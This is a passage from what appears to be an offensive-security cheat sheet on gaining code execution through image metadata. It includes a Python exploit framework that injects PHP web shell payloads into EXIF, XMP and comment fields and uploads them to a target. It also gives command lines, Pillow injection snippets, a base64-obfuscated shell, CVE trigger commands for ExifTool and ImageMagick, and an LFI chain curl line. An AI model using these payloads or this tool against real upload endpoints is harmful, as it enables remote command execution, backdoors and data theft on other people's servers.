          'IPTC:Caption-Abstract', 'IPTC:Writer-Editor',
      ]

      def __init__(self, target_url, upload_path, file_path=None):
          self.target = target_url
          self.upload_path = upload_path
          self.file_path = file_path
          self.session = requests.Session()

      def create_base_image(self, fmt='jpg'):
          """Create minimal valid image"""
          tmp = tempfile.NamedTemporaryFile(suffix=f'.{fmt}', delete=False)
          if fmt == 'jpg':
              tmp.write(bytes([
                  0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10,
                  0x4A, 0x46, 0x49, 0x46, 0x00,
                  0x01, 0x01, 0x00, 0x00, 0x01,
                  0x00, 0x01, 0x00, 0x00,
                  0xFF, 0xD9
              ]))
          elif fmt == 'png':
              import struct, zlib
              def chunk(ct, d):
                  c = ct + d
                  return struct.pack('>I', len(d)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)
              sig = b'\x89PNG\r\n\x1a\n'
              ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
              idat = chunk(b'IDAT', zlib.compress(b'\x00\x00\x00\x00'))
              iend = chunk(b'IEND', b'')
              tmp.write(sig + ihdr + idat + iend)
          elif fmt == 'gif':
              tmp.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
          tmp.close()
          return tmp.name

      def inject_metadata(self, image_path, field, payload):
          """Inject payload into specific metadata field"""
          cmd = ['exiftool', f'-{field}={payload}', '-overwrite_original', image_path]
          result = subprocess.run(cmd, capture_output=True, text=True)
          return result.returncode == 0

      def upload_file(self, file_path, field_name='file'):
          """Upload file to target"""
          with open(file_path, 'rb') as f:
              files = {field_name: (os.path.basename(file_path), f, 'image/jpeg')}
              resp = self.session.post(self.upload_path, files=files)
          return resp

      def check_execution(self, uploaded_url, cmd='id'):
          """Check if payload executed"""
          test_urls = [
              f"{uploaded_url}?cmd={cmd}",
              f"{uploaded_url}?c={cmd}",
              f"{uploaded_url}?x={cmd}",
          ]
          for url in test_urls:
              try:
                  resp = self.session.get(url, timeout=10)
                  if 'uid=' in resp.text or 'root:' in resp.text:
                      return True, url, resp.text
              except Exception:
                  continue
          return False, None, None

      def spray_all(self, payload_type='php_system', fmt='jpg'):
          """Spray payload across all metadata fields"""
          payload = self.PAYLOADS.get(payload_type, payload_type)
          print(f"[*] Spraying payload: {payload}")
          print(f"[*] Format: {fmt}")

          for field in self.FIELDS:
              img = self.create_base_image(fmt)
              if self.inject_metadata(img, field, payload):
                  print(f"[+] Injected into {field}")
                  resp = self.upload_file(img)
                  print(f"    Upload status: {resp.status_code}")
              else:
                  print(f"[-] Failed to inject into {field}")
              os.unlink(img)

      def full_scan(self):
          """Test all payload types across all fields"""
          for ptype, payload in self.PAYLOADS.items():
              print(f"\n{'='*60}")
              print(f"[*] Testing payload type: {ptype}")
              self.spray_all(payload_type=ptype)

  if __name__ == '__main__':
      parser = argparse.ArgumentParser(description='Metadata Exploit Framework')
      parser.add_argument('-t', '--target', required=True, help='Target base URL')
      parser.add_argument('-u', '--upload', required=True, help='Upload endpoint path')
      parser.add_argument('-p', '--payload', default='php_system', help='Payload type')
      parser.add_argument('-f', '--format', default='jpg', choices=['jpg', 'png', 'gif'])
      parser.add_argument('--spray', action='store_true', help='Spray all fields')
      parser.add_argument('--full', action='store_true', help='Full scan all payloads')
      args = parser.parse_args()

      exploiter = MetadataExploiter(args.target, f"{args.target}{args.upload}")

      if args.full:
          exploiter.full_scan()
      elif args.spray:
          exploiter.spray_all(args.payload, args.format)
      else:
          img = exploiter.create_base_image(args.format)
          exploiter.inject_metadata(img, 'Comment', exploiter.PAYLOADS.get(args.payload, args.payload))
          exploiter.upload_file(img)
          os.unlink(img)
  ```
  :::

  :::tabs-item{icon="i-lucide-list" label="Tool Commands"}
  ```bash [Terminal]
  # Spray PHP shell across all metadata fields in JPEG
  python3 meta_exploit.py -t https://target.com -u /api/upload --spray -p php_system -f jpg

  # Full scan with all payload types
  python3 meta_exploit.py -t https://target.com -u /api/upload --full

  # Single payload injection
  python3 meta_exploit.py -t https://target.com -u /api/upload -p php_backtick -f png

  # Custom payload
  python3 meta_exploit.py -t https://target.com -u /api/upload -p '<?php phpinfo(); ?>'

  # Using exiftool-vendored for Node.js applications
  npx exiftool-vendored write -Comment='<?php system($_GET["cmd"]); ?>' evil.jpg

  # Using Pillow for metadata injection (Python)
  python3 -c "
  from PIL import Image
  from PIL.ExifTags import Base
  import piexif

  exif_dict = piexif.load('clean.jpg')
  exif_dict['0th'][piexif.ImageIFD.ImageDescription] = b'<?php system(\$_GET[\"cmd\"]); ?>'
  exif_dict['0th'][piexif.ImageIFD.Artist] = b'<?php passthru(\$_GET[\"c\"]); ?>'
  exif_dict['Exif'][piexif.ExifIFD.UserComment] = b'<?php shell_exec(\$_GET[\"x\"]); ?>'
  exif_bytes = piexif.dump(exif_dict)
  piexif.insert(exif_bytes, 'clean.jpg', 'evil_pillow.jpg')
  "
  ```
  :::
::

---

## Attack Flow Diagram

::note
The following represents the complete metadata-based code execution attack methodology from reconnaissance through exploitation.
::

::code-collapse

```text [Attack Flow - Metadata Code Execution]
┌─────────────────────────────────────────────────────────────────┐
│                    RECONNAISSANCE PHASE                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │ Identify      │    │ Download     │    │ Identify Server  │  │
│  │ Upload        │───▶│ Existing     │───▶│ Processing       │  │
│  │ Endpoints     │    │ Uploads      │    │ Library          │  │
│  └──────────────┘    └──────────────┘    └──────────────────┘  │
│                                                 │               │
│                                                 ▼               │
│                                    ┌──────────────────────┐    │
│                                    │ Extract Metadata     │    │
│                                    │ from Downloaded      │    │
│                                    │ Files (exiftool)     │    │
│                                    └──────────┬───────────┘    │
│                                               │                │
└───────────────────────────────────────────────┼────────────────┘
                                                │
┌───────────────────────────────────────────────┼────────────────┐
│                    ANALYSIS PHASE              │                │
├───────────────────────────────────────────────┼────────────────┤
│                                               ▼                │
│                              ┌──────────────────────────┐      │
│                              │ Upload Probe Image       │      │
│                              │ (markers in all fields)  │      │
│                              └──────────┬───────────────┘      │
│                                         │                      │
│                    ┌────────────────────┼──────────────────┐   │
│                    ▼                    ▼                   ▼   │
│          ┌──────────────┐  ┌──────────────────┐  ┌──────────┐ │
│          │ Metadata     │  │ Metadata         │  │ Metadata │ │
│          │ Preserved    │  │ Stripped but      │  │ Fully    │ │
│          │ (Direct      │  │ Re-rendered       │  │ Stripped │ │
│          │ Attack)      │  │ (Indirect Attack) │  │ (Pivot)  │ │
│          └──────┬───────┘  └────────┬──────────┘  └─────┬────┘ │
│                 │                   │                    │      │
└─────────────────┼───────────────────┼────────────────────┼─────┘
                  │                   │                    │
┌─────────────────┼───────────────────┼────────────────────┼─────┐
│                 │    EXPLOITATION PHASE                   │     │
├─────────────────┼───────────────────┼────────────────────┼─────┤
│                 ▼                   ▼                    ▼     │
│    ┌──────────────────┐ ┌────────────────┐ ┌─────────────────┐│
│    │ DIRECT EXECUTION │ │ CHAINED ATTACK │ │ PROCESSING      ││
│    ├──────────────────┤ ├────────────────┤ │ EXPLOIT         ││
│    │                  │ │                │ ├─────────────────┤│
│    │ • PHP in EXIF    │ │ • LFI + Meta   │ │ • ImageTragick  ││
│    │ • PHP in XMP     │ │ • RFI + Meta   │ │ • CVE-2022-     ││
│    │ • PHP in ICC     │ │ • SSTI + Meta  │ │   44268         ││
│    │ • PHP in Comment │ │ • Log Poison   │ │ • ExifTool RCE  ││
│    │ • XSS in fields  │ │   + Meta       │ │ • GhostScript   ││
│    │ • SQLi in fields │ │ • Session      │ │ • Pillow CVEs   ││
│    │ • SSTI in fields │ │   Injection    │ │ • Sharp CVEs    ││
│    │ • CMDi in fields │ │ • .htaccess    │ │ • LibTIFF CVEs  ││
│    │                  │ │   override     │ │                 ││
│    └────────┬─────────┘ └───────┬────────┘ └────────┬────────┘│
│             │                   │                    │         │
│             └───────────────────┼────────────────────┘         │
│                                 │                              │
│                                 ▼                              │
│                    ┌──────────────────────┐                    │
│                    │   PAYLOAD FORMATS    │                    │
│                    ├──────────────────────┤                    │
│                    │                      │                    │
│                    │ ┌──────────────────┐ │                    │
│                    │ │ JPEG (EXIF/COM/  │ │                    │
│                    │ │ APP/ICC/XMP)     │ │                    │
│                    │ ├──────────────────┤ │                    │
│                    │ │ PNG (tEXt/iTXt/  │ │                    │
│                    │ │ zTXt/ICC)        │ │                    │
│                    │ ├──────────────────┤ │                    │
│                    │ │ GIF (Comment/    │ │                    │
│                    │ │ XMP Extension)   │ │                    │
│                    │ ├──────────────────┤ │                    │
│                    │ │ SVG (XML/Script/ │ │                    │
│                    │ │ foreignObject)   │ │                    │
│                    │ ├──────────────────┤ │                    │
│                    │ │ PDF (JS/Action/  │ │                    │
│                    │ │ Form/Annot)      │ │                    │
│                    │ ├──────────────────┤ │                    │
│                    │ │ DOCX/XLSX/PPTX   │ │                    │
│                    │ │ (core.xml/XMP)   │ │                    │
│                    │ ├──────────────────┤ │                    │
│                    │ │ MP3/MP4/FLAC     │ │                    │
│                    │ │ (ID3/Atoms)      │ │                    │
│                    │ └──────────────────┘ │                    │
│                    └──────────┬───────────┘                    │
│                               │                                │
│                               ▼                                │
│                  ┌──────────────────────────┐                  │
│                  │    BYPASS TECHNIQUES     │                  │
│                  ├──────────────────────────┤                  │
│                  │ • Base64 encoding        ��                  │
│                  │ • Hex encoding            │                  │
│                  │ • ROT13 encoding          │                  │
│                  │ • String concatenation    │                  │
│                  │ • Variable functions      │                  │
│                  │ • Case variation          │                  │
│                  │ • Comment insertion       │                  │
│                  │ • Null byte injection     │                  │
│                  │ • Double encoding         │                  │
│                  │ • Unicode BOM             │                  │
│                  │ • Alternative PHP tags    │                  │
│                  │ • Callback functions      │                  │
│                  │ • Polyglot construction   │                  │
│                  └──────────┬───────────────┘                  │
│                             │                                  │
│                             ▼                                  │
│                  ┌──────────────────────┐                      │
│                  │   POST-EXPLOITATION  │                      │
│                  ├──────────────────────┤                      │
│                  │ • Reverse shell      │                      │
│                  │ • Persistent backdoor│                      │
│                  │ • Privilege escalation│                     │
│                  │ • Lateral movement   │                      │
│                  │ • Data exfiltration  │                      │
│                  └──────────────────────┘                      │
└────────────────────────────────────────────────────────────────┘
```

::

---

## Metadata Field Reference Matrix

::collapsible

| Format | Field | Tool Command | Survives GD | Survives IM | Survives Pillow | Survives Sharp |
|--------|-------|-------------|:-----------:|:-----------:|:---------------:|:--------------:|
| JPEG | EXIF Comment | `exiftool -Comment=PAYLOAD` | ❌ | ⚠️ | ❌ | ❌ |
| JPEG | EXIF Artist | `exiftool -Artist=PAYLOAD` | ❌ | ⚠️ | ❌ | ❌ |
| JPEG | EXIF Copyright | `exiftool -Copyright=PAYLOAD` | ❌ | ⚠️ | ❌ | ❌ |
| JPEG | EXIF ImageDescription | `exiftool -ImageDescription=PAYLOAD` | ❌ | ⚠️ | ❌ | ❌ |
| JPEG | EXIF UserComment | `exiftool -UserComment=PAYLOAD` | ❌ | ⚠️ | ❌ | ❌ |
| JPEG | JFIF Comment (COM) | `printf \xFF\xFE + payload` | ❌ | ✅ | ❌ | ❌ |
| JPEG | ICC Profile | `exiftool -ICC_Profile<=file.icc` | ❌ | ✅ | ⚠️ | ⚠️ |
| JPEG | XMP | `exiftool -XMP-dc:Description=PAYLOAD` | ❌ | ⚠️ | ❌ | ❌ |
| PNG | tEXt | `python3 (manual chunk)` | ❌ | ⚠️ | ❌ | ❌ |
| PNG | iTXt | `exiftool -XMP-dc:Description=PAYLOAD` | ❌ | ⚠️ | ❌ | ❌ |
| PNG | ICC Profile | `exiftool -ICC_Profile<=file.icc` | ❌ | ✅ | ⚠️ | ⚠️ |
| GIF | Comment | `exiftool -Comment=PAYLOAD` | ❌ | ⚠️ | ❌ | ❌ |
| GIF | XMP | `exiftool -XMP-dc:Description=PAYLOAD` | ❌ | ⚠️ | ❌ | ❌ |
| SVG | XML body | Direct XML edit | N/A | ✅ | N/A | N/A |
| PDF | Metadata | `exiftool -Title=PAYLOAD` | N/A | N/A | N/A | N/A |
| DOCX | core.xml | Unzip + edit + rezip | N/A | N/A | N/A | N/A |
| MP3 | ID3 Comment | `exiftool -Comment=PAYLOAD` | N/A | N/A | N/A | N/A |
| MP4 | Metadata | `ffmpeg -metadata title=PAYLOAD` | N/A | N/A | N/A | N/A |

::badge
✅ = Survives | ⚠️ = Partial/Version-dependent | ❌ = Stripped
::

::

---

## Quick Reference Cheat Sheet

::field-group
  ::field{name="EXIF PHP Shell" type="command"}
  `exiftool -Comment='<?php system($_GET["cmd"]); ?>' evil.jpg`
  ::

  ::field{name="Multi-Field Spray" type="command"}
  `exiftool -Comment=PAYLOAD -Artist=PAYLOAD -Copyright=PAYLOAD -UserComment=PAYLOAD evil.jpg`
  ::

  ::field{name="XMP XXE" type="command"}
  `exiftool "-XMP<=xxe_payload.xmp" evil.jpg`
  ::

  ::field{name="ICC Profile Injection" type="command"}
  `exiftool -ICC_Profile<=malicious.icc evil.jpg`
  ::

  ::field{name="GIF PHP Shell" type="command"}
  `printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif`
  ::

  ::field{name="SVG XSS" type="command"}
  `<svg onload="alert(document.domain)">`
  ::

  ::field{name="ExifTool RCE (CVE-2021-22204)" type="command"}
  `djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz`
  ::

  ::field{name="ImageMagick File Read (CVE-2022-44268)" type="command"}
  `PNG tEXt chunk: profile\x00/etc/passwd`
  ::

  ::field{name="Verify Injection" type="command"}
  `strings evil.jpg | grep "php" && exiftool -Comment evil.jpg`
  ::

  ::field{name="Metadata Survival Check" type="command"}
  `exiftool -a uploaded.jpg | diff - <(exiftool -a original.jpg)`
  ::

  ::field{name="Base64 Encoded Shell" type="command"}
  `exiftool -Comment="<?php eval(base64_decode('c3lzdGVtKCRfR0VUWyJjbWQiXSk7')); ?>" evil.jpg`
  ::

  ::field{name="LFI Chain Trigger" type="command"}
  `curl "https://target.com/index.php?page=../uploads/evil.jpg&cmd=id"`
  ::
::